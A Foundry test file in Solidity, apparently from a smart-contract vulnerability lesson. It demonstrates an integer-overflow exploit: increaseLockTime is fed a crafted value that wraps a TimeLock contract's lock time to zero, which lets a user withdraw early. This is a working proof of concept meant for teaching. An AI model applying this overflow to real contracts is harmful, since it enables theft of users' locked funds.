// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "src/0001_integer_overflow/TimeLock.sol";

contract ContractTest is Test {
    TimeLock timeLockContract;
    address alice;
    address bob;

    function setUp() public {
        timeLockContract = new TimeLock();
        alice = vm.addr(1);
        bob = vm.addr(2);
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
    }

    function testFail_AliceWithdraw() public {
        vm.startPrank(alice);
        timeLockContract.deposit{value: 1 ether}();

        timeLockContract.withdraw();
        vm.stopPrank();
    }

    function test_BobWithdraw() public {
        vm.prank(alice);
        timeLockContract.deposit{value: 1 ether}();

        vm.startPrank(bob);
        timeLockContract.deposit{value: 1 ether}();
        console.log(
            "before hack, bob lock time: %s",
            timeLockContract.lockTime(bob)
        );

        // exploit
        timeLockContract.increaseLockTime(
            type(uint).max - timeLockContract.lockTime(bob) + 1
        );
        vm.stopPrank();

        console.log(
            "after hack, bob lock time: %s",
            timeLockContract.lockTime(bob)
        );
        assert(timeLockContract.lockTime(bob) == 0);

        vm.prank(bob);
        timeLockContract.withdraw();

        assert(bob.balance == 1 ether);
        assert(timeLockContract.balances(bob) == 0);
        assert(alice.balance == 0);
    }
}
